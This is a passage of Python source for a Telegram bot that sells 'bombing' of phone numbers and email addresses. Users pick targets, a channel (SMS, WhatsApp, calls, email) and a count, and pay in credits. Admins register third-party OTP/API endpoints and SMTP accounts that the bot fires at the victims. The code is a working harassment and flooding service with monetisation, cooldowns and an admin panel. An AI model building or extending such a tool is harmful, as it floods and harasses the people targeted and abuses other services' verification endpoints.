    await c.message.edit_text(f"🎉 +{bonus}\n💳 Balance: <b>{u2['credits']}</b>",
                              reply_markup=back_kb())


# ─────────────────────── BOMB FLOW ───────────────────────
@dp.callback_query(F.data == "m:bomb")
async def cb_bomb_start(c, state):
    u = get_user(c.from_user.id)
    if u["banned"]: return await c.answer("You are banned.", show_alert=True)
    if setting("maintenance", int): return await c.answer("Maintenance.", show_alert=True)
    await state.set_state(UserFSM.bomb_target)
    await c.message.edit_text(
        "🎯 <b>Step 1/3 — Target</b>\n\n"
        "Send one target or several (comma-separated).\n\n"
        "<b>Examples:</b>\n"
        "• <code>8824302646</code> (phone)\n"
        "• <code>8824302646,9876543210</code> (bulk)\n"
        "• <code>user@example.com</code> (email)\n\n"
        "10-digit numbers get country code added automatically.",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.bomb_target)
async def fsm_bomb_target(m, state):
    raw = m.text.strip()
    if not raw or len(raw) > 512:
        return await m.answer("❌ Invalid.", reply_markup=cancel_kb())
    targets = [t.strip() for t in raw.replace("\n", ",").split(",") if t.strip()]
    if not targets:
        return await m.answer("❌ No valid targets.", reply_markup=cancel_kb())
    await state.update_data(targets=targets)
    await state.set_state(UserFSM.bomb_count)
    preview = ", ".join(targets[:5]) + ("..." if len(targets) > 5 else "")
    await m.answer(
        f"🎯 Targets ({len(targets)}): <code>{preview}</code>\n\n"
        f"<b>Step 2/3 — Channel</b>\n\nPick how to fire.",
        reply_markup=channel_kb())


@dp.callback_query(F.data.startswith("m:chan:"))
async def cb_chan(c, state):
    chan = c.data.split(":")[2]
    data = await state.get_data()
    if not data.get("targets"):
        await state.clear()
        return await c.answer("expired, start over", show_alert=True)
    cats = {"sms": ["sms"], "whatsapp": ["whatsapp"], "call": ["call"],
            "email": ["email", "smtp"], "all": ["sms", "whatsapp", "call", "email", "smtp", "legacy"]}
    if chan not in cats:
        return await c.answer("bad")
    await state.update_data(categories=cats[chan], chan_label=chan)
    await state.set_state(UserFSM.bomb_count)
    await c.message.edit_text(
        f"📡 Channel: <b>{chan.upper()}</b>\n\n"
        f"<b>Step 3/3 — Count</b>\n\nPick preset or Custom.",
        reply_markup=count_kb())
    await c.answer()


@dp.callback_query(F.data == "m:count:custom")
async def cb_custom_count(c, state):
    data = await state.get_data()
    if not data.get("targets"):
        await state.clear()
        return await c.answer("expired", show_alert=True)
    await state.set_state(UserFSM.bomb_custom_count)
    max_c = setting("max_count", int)
    await c.message.edit_text(
        f"✍️ <b>Custom Count</b>\n\n"
        f"Send any number 1–<b>{max_c}</b>.\n"
        f"Example: <code>1208</code> or <code>507</code>",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.bomb_custom_count)
async def fsm_custom_count(m, state):
    if not m.text.strip().isdigit():
        return await m.answer("❌ Send a number.", reply_markup=cancel_kb())
    count = int(m.text.strip())
    data = await state.get_data()
    await state.clear()
    await _start_bomb(m, m.from_user.id, data.get("targets"),
                      count, data.get("categories"), data.get("chan_label"))


@dp.callback_query(F.data.startswith("m:count:"))
async def cb_count(c, state):
    part = c.data.split(":")[2]
    if part == "custom": return
    try: count = int(part)
    except ValueError: return await c.answer("bad")
    data = await state.get_data()
    if not data.get("targets"):
        await state.clear()
        return await c.answer("expired", show_alert=True)
    await state.clear()
    await _start_bomb(c.message, c.from_user.id, data["targets"], count,
                      data.get("categories") or ["legacy"],
                      data.get("chan_label") or "legacy", edit=True)
    await c.answer()


async def _start_bomb(msg, uid, targets, count, categories, chan_label, edit=False):
    if not targets:
        return await msg.answer("no targets")
    u = get_user(uid)
    if u["banned"]: return
    max_c = setting("max_count", int)
    if count < 1 or count > max_c:
        return await msg.answer(f"❌ count must be 1..{max_c}")
    now = int(time.time())
    cooldown = setting("cooldown", int)
    if u["vip_cost"] <= 0 and now - u["last_bomb"] < cooldown:
        return await msg.answer(f"⏳ wait {cooldown - (now - u['last_bomb'])}s")
    for t in targets:
        if is_blacklisted(t):
            return await msg.answer(f"🚫 target <code>{t}</code> is blacklisted")
    cost = u["vip_cost"] if u["vip_cost"] > 0 else setting("bomb_cost", int)
    if not take_credits(uid, cost):
        return await msg.answer(f"❌ need {cost} credits")
    _exec("UPDATE users SET last_bomb=?, total_bombs=total_bombs+1 WHERE user_id=?",
          (now, uid))
    log_action(uid, "bomb", f"{len(targets)}tgt x{count} cat={chan_label}")
    preview = ", ".join(targets[:3]) + ("..." if len(targets) > 3 else "")
    text = (f"🚀 <b>Launching</b>\n\n"
            f"🎯 {len(targets)} target(s): <code>{preview}</code>\n"
            f"📡 Channel: <b>{(chan_label or 'legacy').upper()}</b>\n"
            f"💥 Count: <b>{count}</b>")
    status = await (msg.edit_text(text) if edit else msg.answer(text))
    asyncio.create_task(_run_and_report(status, uid, targets, count,
                                        "OTP", chan_label, categories))


async def _run_and_report(status_msg, uid, targets, count, msg, chan_label, categories):
    try:
        ok, fail, err = await bomb_worker(targets, count, msg, categories)
        if err:
            text = f"⚠️ Cannot fire: {err}"
        else:
            text = (f"✅ <b>Done</b>\n\n"
                    f"🎯 {len(targets)} target(s)\n"
                    f"📡 Channel: <b>{(chan_label or 'legacy').upper()}</b>\n"
                    f"📨 Sent: <b>{ok}</b>  ❌ Failed: <b>{fail}</b>\n"
                    f"💳 Balance: <b>{get_user(uid)['credits']}</b>")
        _exec("INSERT INTO bomb_history(user_id,target,count,msg,ok,fail,category,ts) "
              "VALUES(?,?,?,?,?,?,?,?)",
              (uid, ",".join(targets)[:200], count, msg, ok, fail, chan_label, int(time.time())))
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💣 Bomb Again", callback_data="m:bomb"),
             InlineKeyboardButton(text="🏠 Main Menu",  callback_data="m:home")]])
        try: await status_msg.edit_text(text, reply_markup=kb)
        except Exception: pass
    except Exception as e:
        log.exception("bomb crashed")
        try: await status_msg.edit_text(f"⚠️ crashed: <code>{e}</code>",
                                        reply_markup=back_kb())
        except Exception: pass


# ─────────────────────── REDEEM ───────────────────────
@dp.callback_query(F.data == "m:redeem")
async def cb_redeem_start(c, state):
    await state.set_state(UserFSM.redeem_code)
    await c.message.edit_text("🎁 <b>Redeem Code</b>\n\nSend your code.",
                              reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.redeem_code)
async def fsm_redeem(m, state):
    code = m.text.strip().upper()
    await state.clear()
    row = _exec("SELECT * FROM redeem_codes WHERE code=? AND active=1", (code,), fetch="one")
    if not row:
        return await m.answer("❌ Invalid code.", reply_markup=main_menu_kb(is_admin(m.from_user.id)))
    if row["used"] >= row["max_uses"]:
        return await m.answer("❌ Exhausted.", reply_markup=main_menu_kb(is_admin(m.from_user.id)))
    if _exec("SELECT 1 FROM redeem_uses WHERE code=? AND user_id=?", (code, m.from_user.id), fetch="one"):
        return await m.answer("❌ Already used.", reply_markup=main_menu_kb(is_admin(m.from_user.id)))
    add_credits(m.from_user.id, row["amount"])
    _exec("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
    _exec("INSERT INTO redeem_uses(code,user_id,used_at) VALUES(?,?,?)",
          (code, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "redeem", f"{code} +{row['amount']}")
    await m.answer(
        f"✅ +{row['amount']} credits\n"
        f"💳 Balance: <b>{get_user(m.from_user.id)['credits']}</b>",
        reply_markup=main_menu_kb(is_admin(m.from_user.id)))


# ─────────────────────── ADMIN PANEL ───────────────────────
def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Stats",       callback_data="a:stats"),
         InlineKeyboardButton(text="👥 Users",       callback_data="a:users:0")],
        [InlineKeyboardButton(text="➕ Add Credits", callback_data="a:add"),
         InlineKeyboardButton(text="➖ Deduct",      callback_data="a:ded")],
        [InlineKeyboardButton(text="🎁 Redeem",      callback_data="a:redeem"),
         InlineKeyboardButton(text="🔌 APIs",        callback_data="a:apis")],
        [InlineKeyboardButton(text="📧 SMTP",        callback_data="a:smtp"),
         InlineKeyboardButton(text="⚙️ Settings",    callback_data="a:settings")],
        [InlineKeyboardButton(text="📢 Broadcast",   callback_data="a:bcast"),
         InlineKeyboardButton(text="🔎 Find User",   callback_data="a:find")],
        [InlineKeyboardButton(text="🚫 Blacklist",   callback_data="a:black"),
         InlineKeyboardButton(text="⭐ VIP",         callback_data="a:vip")],
        [InlineKeyboardButton(text="👑 Admins",      callback_data="a:admins"),
         InlineKeyboardButton(text="📋 Logs",        callback_data="a:logs:0")],
        [InlineKeyboardButton(text="📤 Export",      callback_data="a:export"),
         InlineKeyboardButton(text="🏠 Main Menu",   callback_data="m:home")],
    ])


def admin_back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]])


@dp.callback_query(F.data == "a:home")
async def cb_a_home(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.clear()
    await c.message.edit_text("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())
    await c.answer()


@dp.callback_query(F.data == "a:stats")
async def cb_a_stats(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    banned = _exec("SELECT COUNT(*) c FROM users WHERE banned=1", fetch="one")["c"]
    credits = _exec("SELECT COALESCE(SUM(credits),0) s FROM users", fetch="one")["s"]
    bombs = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users", fetch="one")["s"]
    codes = _exec("SELECT COUNT(*) c FROM redeem_codes WHERE active=1", fetch="one")["c"]
    admins_n = _exec("SELECT COUNT(*) c FROM admins", fetch="one")["c"]
    smtps = _exec("SELECT COUNT(*) c FROM smtp_accounts WHERE active=1", fetch="one")["c"]
    per_cat = _exec("SELECT category, COUNT(*) c, COALESCE(SUM(ok_count),0) o, "
                    "COALESCE(SUM(fail_count),0) f FROM apis WHERE active=1 "
                    "GROUP BY category", fetch="all")
    cat_lines = [f"  • <b>{r['category'] or '?'}</b>: {r['c']} active, "
                 f"{r['o']}✅ {r['f']}❌" for r in per_cat]
    await c.message.edit_text(
        f"📊 <b>Stats</b>\n\n"
        f"👥 Users: <b>{total}</b> (banned {banned})\n"
        f"👑 Admins: <b>{admins_n}</b>\n"
        f"💳 Credits in circulation: <b>{credits}</b>\n"
        f"💥 Total bombs: <b>{bombs}</b>\n"
        f"🎁 Active codes: <b>{codes}</b>\n"
        f"📧 Active SMTP: <b>{smtps}</b>\n\n"
        f"<b>Channels:</b>\n" + ("\n".join(cat_lines) or "  none"),
        reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data.startswith("a:users:"))
async def cb_a_users(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    page = int(c.data.split(":")[2])
    per = 10
    total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    max_p = max(0, (total - 1) // per)
    page = min(page, max_p)
    rows = _exec("SELECT * FROM users ORDER BY created_at DESC LIMIT ? OFFSET ?",
                 (per, page * per), fetch="all")
    lines = [f"{'🚫' if r['banned'] else '✅'} <code>{r['user_id']}</code> "
             f"@{r['username'] or '-'} | 💳{r['credits']} | 💥{r['total_bombs']}"
             for r in rows]
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"a:users:{page-1}"))
    if page < max_p: nav.append(InlineKeyboardButton(text="➡️", callback_data=f"a:users:{page+1}"))
    kb = ([nav] if nav else []) + [[InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]
    await c.message.edit_text(f"👥 <b>Users</b> ({page+1}/{max_p+1})\n\n" +
                              ("\n".join(lines) or "none"),
                              reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await c.answer()


# ─── Admins mgmt ───
@dp.callback_query(F.data == "a:admins")
async def cb_admins(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM admins ORDER BY added_at", fetch="all")
    lines = [f"👑 <code>{r['user_id']}</code>" for r in rows]
    await c.message.edit_text(
        "👑 <b>Admins</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:admin_add"),
             InlineKeyboardButton(text="🗑 Remove", callback_data="a:admin_remove")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:admin_add")
async def cb_admin_add(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.add_admin_id)
    await c.message.edit_text("👑 user_id to promote", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.add_admin_id)
async def fsm_admin_add(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    uid = int(m.text.strip())
    if not get_user(uid): return await m.answer("user not found — they must /start first")
    _exec("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) VALUES(?,?,?)",
          (uid, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "admin_add", str(uid))
    await state.clear()
    await m.answer(f"✅ <code>{uid}</code> is now admin.", reply_markup=admin_kb())
    try: await bot.send_message(uid, "👑 You are now an admin.")
    except Exception: pass


@dp.callback_query(F.data == "a:admin_remove")
async def cb_admin_rm(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.remove_admin_id)
    await c.message.edit_text("👑 user_id to demote", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.remove_admin_id)
async def fsm_admin_rm(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    uid = int(m.text.strip())
    if uid == m.from_user.id: return await m.answer("can't remove yourself")
    _exec("DELETE FROM admins WHERE user_id=?", (uid,))
    log_action(m.from_user.id, "admin_remove", str(uid))
    await state.clear()
    await m.answer(f"✅ removed", reply_markup=admin_kb())


# ─── Credits ───
@dp.callback_query(F.data == "a:add")
async def cb_add(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.add_credits_uid)
    await c.message.edit_text("➕ user_id", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.add_credits_uid)
async def fsm_a_uid(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.add_credits_amt)
    await m.answer("amount")


@dp.message(AdminFSM.add_credits_amt)
async def fsm_a_amt(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: amt = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    d = await state.get_data(); uid = d.get("uid")
    if not get_user(uid): await state.clear(); return await m.answer("not found")
    add_credits(uid, amt)
    log_action(m.from_user.id, "admin_add_credits", f"to={uid} amt={amt}")
    await state.clear()
    await m.answer(f"✅ +{amt} to <code>{uid}</code>", reply_markup=admin_kb())
    try: await bot.send_message(uid, f"💳 +{amt} credits from admin.")
    except Exception: pass


@dp.callback_query(F.data == "a:ded")
async def cb_ded(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.ded_credits_uid)
    await c.message.edit_text("➖ user_id", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.ded_credits_uid)
async def fsm_d_uid(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.ded_credits_amt)
    await m.answer("amount")


@dp.message(AdminFSM.ded_credits_amt)
async def fsm_d_amt(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: amt = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    d = await state.get_data(); uid = d.get("uid")
    u = get_user(uid) if uid else None
    if not u: await state.clear(); return await m.answer("not found")
    new = max(0, u["credits"] - amt)
    _exec("UPDATE users SET credits=? WHERE user_id=?", (new, uid))
    log_action(m.from_user.id, "admin_ded_credits", f"to={uid} amt={amt}")
    await state.clear()
    await m.answer(f"✅ new balance {new}", reply_markup=admin_kb())


# ─── Redeem ───
@dp.callback_query(F.data == "a:redeem")
async def cb_a_redeem(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM redeem_codes ORDER BY created_at DESC LIMIT 15", fetch="all")
    lines = [f"<code>{r['code']}</code> | {r['amount']}c | {r['used']}/{r['max_uses']}"
             for r in rows]
    await c.message.edit_text(
        "🎁 <b>Redeem Codes</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Create", callback_data="a:redeem_new")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:redeem_new")
async def cb_redeem_new(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.redeem_amount)
    await c.message.edit_text("Amount", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.redeem_amount)
async def fsm_r_amt(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: amt = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    await state.update_data(amount=amt)
    await state.set_state(AdminFSM.redeem_uses)
    await m.answer("max uses (0=unlimited)")


@dp.message(AdminFSM.redeem_uses)
async def fsm_r_uses(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: uses = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    if uses <= 0: uses = 10**9
    d = await state.get_data()
    code = gen_code(10)
    _exec("INSERT INTO redeem_codes(code,amount,max_uses,created_by,created_at) "
          "VALUES(?,?,?,?,?)", (code, d["amount"], uses, m.from_user.id, int(time.time())))
    await state.clear()
    await m.answer(f"✅ <code>{code}</code> ({d['amount']}c)", reply_markup=admin_kb())


# ─── APIs ───
@dp.callback_query(F.data == "a:apis")
async def cb_apis(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    active = _exec("SELECT COUNT(*) c FROM apis WHERE active=1", fetch="one")["c"]
    rows = _exec("SELECT * FROM apis ORDER BY category, id LIMIT 30", fetch="all")
    lines = [f"#{r['id']} [{r['category']}] <b>{r['name']}</b> "
             f"{'✅' if r['active'] else '🚫'} {r['ok_count']}/{r['fail_count']}"
             for r in rows]
    await c.message.edit_text(
        f"🔌 <b>APIs</b> — {active}/{total} active\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:api_new"),
             InlineKeyboardButton(text="🗑 Del", callback_data="a:api_del")],
            [InlineKeyboardButton(text="🔁 Toggle", callback_data="a:api_tog"),
             InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:api_new")
async def cb_api_new(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.api_name)
    await c.message.edit_text("API name", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.api_name)
async def fsm_apin(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(name=m.text.strip())
    await state.set_state(AdminFSM.api_category)
    await m.answer("Category: <code>sms</code> / <code>whatsapp</code> / "
                   "<code>call</code> / <code>email</code> / <code>legacy</code>")


@dp.message(AdminFSM.api_category)
async def fsm_apicat(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    cat = m.text.strip().lower()
    if cat not in ("sms", "whatsapp", "call", "email", "legacy"):
        return await m.answer("pick one of: sms whatsapp call email legacy")
    await state.update_data(category=cat)
    await state.set_state(AdminFSM.api_url)
    await m.answer("URL. Use {target} and {msg}.")


@dp.message(AdminFSM.api_url)
async def fsm_apiu(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(url=m.text.strip())
    await state.set_state(AdminFSM.api_method)
    await m.answer("GET / POST / PUT")


@dp.message(AdminFSM.api_method)
async def fsm_apim(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    meth = m.text.strip().upper()
    if meth not in ("GET","POST","PUT"): return await m.answer("GET / POST / PUT")
    await state.update_data(method=meth)
    await state.set_state(AdminFSM.api_body)
    await m.answer("Body (or '-')")


@dp.message(AdminFSM.api_body)
async def fsm_apib(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(body="" if m.text.strip() == "-" else m.text.strip())
    await state.set_state(AdminFSM.api_headers)
    await m.answer("Headers 'Key: Value' per line (or '-')")


@dp.message(AdminFSM.api_headers)
async def fsm_apih(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    headers = "" if m.text.strip() == "-" else m.text.strip()
    d = await state.get_data()
    _exec("INSERT INTO apis(name,channel,category,url,method,body,headers,created_at) "
          "VALUES(?,?,?,?,?,?,?,?)",
          (d["name"], "http", d["category"], d["url"], d["method"], d["body"],
           headers, int(time.time())))
    log_action(m.from_user.id, "admin_add_api", d["name"])
    await state.clear()
    await m.answer("✅ API added", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:api_del")
async def cb_api_del(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="api_del")
    await c.message.edit_text("API ID to delete", reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:api_tog")
async def cb_api_tog(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="api_tog")
    await c.message.edit_text("API ID to toggle", reply_markup=admin_back_kb())
    await c.answer()


# ─── SMTP ───
@dp.callback_query(F.data == "a:smtp")
async def cb_smtp(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM smtp_accounts ORDER BY id", fetch="all")
    lines = [f"#{r['id']} {r['username']} @{r['host']}:{r['port']} "
             f"{'✅' if r['active'] else '🚫'}" for r in rows]
    await c.message.edit_text(
        "📧 <b>SMTP</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:smtp_new"),
             InlineKeyboardButton(text="🗑 Del", callback_data="a:smtp_del")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:smtp_new")
async def cb_smtp_new(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.smtp_host)
    await c.message.edit_text("SMTP host", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.smtp_host)
async def fsm_s_host(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(host=m.text.strip())
    await state.set_state(AdminFSM.smtp_port)
    await m.answer("Port (587 or 465)")


@dp.message(AdminFSM.smtp_port)
async def fsm_s_port(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: port = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    await state.update_data(port=port)
    await state.set_state(AdminFSM.smtp_user)
    await m.answer("Username (email)")


@dp.message(AdminFSM.smtp_user)
async def fsm_s_user(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(username=m.text.strip())
    await state.set_state(AdminFSM.smtp_pass)
    await m.answer("Password / app password")


@dp.message(AdminFSM.smtp_pass)
async def fsm_s_pass(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(password=m.text.strip())
    await state.set_state(AdminFSM.smtp_name)
    await m.answer("From name")


@dp.message(AdminFSM.smtp_name)
async def fsm_s_name(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    d = await state.get_data()
    _exec("INSERT INTO smtp_accounts(host,port,username,password,from_name) "
          "VALUES(?,?,?,?,?)",
          (d["host"], d["port"], d["username"], d["password"], m.text.strip()))
    await state.clear()
    await m.answer("✅ SMTP added", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:smtp_del")
async def cb_smtp_del(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="smtp_del")
    await c.message.edit_text("SMTP ID to delete", reply_markup=admin_back_kb())
    await c.answer()


# ─── Settings ───
@dp.callback_query(F.data == "a:settings")
async def cb_settings(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    keys = ["bomb_cost","max_count","cooldown","concurrency","daily_bonus",
            "referral_bonus","maintenance","country_code"]
    txt = "⚙️ <b>Settings</b>\n\n" + "\n".join(f"{k}: <b>{setting(k)}</b>" for k in keys)
    rows = []
    for i in range(0, len(keys), 2):
        row = [InlineKeyboardButton(text=keys[i], callback_data=f"a:set:{keys[i]}")]
        if i + 1 < len(keys):
            row.append(InlineKeyboardButton(text=keys[i+1], callback_data=f"a:set:{keys[i+1]}"))
        rows.append(row)
    rows.append([InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")])
    await c.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await c.answer()


@dp.callback_query(F.data.startswith("a:set:"))
async def cb_set_e(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    key = c.data.split(":", 2)[2]
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="setting", key=key)
    await c.message.edit_text(f"New value for <b>{key}</b>", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.edit_setting)
async def fsm_edit_set(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    d = await state.get_data()
    mode = d.get("mode")

    if mode == "setting":
        key = d.get("key"); val = m.text.strip()
        if key in {"bomb_cost","max_count","cooldown","concurrency",
                   "daily_bonus","referral_bonus","maintenance"}:
            try: int(val)
            except ValueError: return await m.answer("numeric required")
        set_setting(key, val)
        await state.clear()
        return await m.answer(f"✅ {key} = {val}", reply_markup=admin_kb())

    if mode == "api_del":
        if not m.text.strip().isdigit(): return await m.answer("numeric id")
        _exec("DELETE FROM apis WHERE id=?", (int(m.text.strip()),))
        await state.clear(); return await m.answer("✅ deleted", reply_markup=admin_kb())

    if mode == "api_tog":
        if not m.text.strip().isdigit(): return await m.answer("numeric id")
        _exec("UPDATE apis SET active=1-active, fail_streak=0 WHERE id=?",
              (int(m.text.strip()),))
        await state.clear(); return await m.answer("✅ toggled", reply_markup=admin_kb())

    if mode == "smtp_del":
        if not m.text.strip().isdigit(): return await m.answer("numeric id")
        _exec("DELETE FROM smtp_accounts WHERE id=?", (int(m.text.strip()),))
        await state.clear(); return await m.answer("✅ deleted", reply_markup=admin_kb())

    if mode == "black_del":
        t = m.text.strip()
        _exec("DELETE FROM blacklist WHERE target=?", (t,))
        await state.clear(); return await m.answer(f"✅ removed <code>{t}</code>",
                                                   reply_markup=admin_kb())

    await state.clear()
    return await m.answer("⚠️ state lost.", reply_markup=admin_kb())


# ─── Find / Ban / Blacklist / VIP / Logs / Export ───
@dp.callback_query(F.data == "a:find")
async def cb_find(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.find_user)
    await c.message.edit_text("user_id", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.find_user)
async def fsm_find(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    uid = int(m.text.strip())
    u = get_user(uid)
    if not u: return await m.answer("not found")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚫 Ban" if not u["banned"] else "✅ Unban",
                              callback_data=f"a:ban:{uid}")],
        [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]])
    await m.answer(
        f"👤 <code>{uid}</code>\n@{u['username'] or '-'} | {u['first_name']}\n"
        f"💳 {u['credits']} | 💥 {u['total_bombs']}\n"
        f"⭐ vip: {u['vip_cost']}\n"
        f"{'🚫 banned' if u['banned'] else '✅ active'}",
        reply_markup=kb)
    await state.clear()


@dp.callback_query(F.data.startswith("a:ban:"))
async def cb_ban(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    uid = int(c.data.split(":")[2])
    _exec("UPDATE users SET banned=1-banned WHERE user_id=?", (uid,))
    await c.answer("toggled", show_alert=True)


@dp.callback_query(F.data == "a:bcast")
async def cb_bc(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.broadcast)
    await c.message.edit_text("Broadcast message", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.broadcast)
async def fsm_bc(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.clear()
    asyncio.create_task(_do_bcast(m))


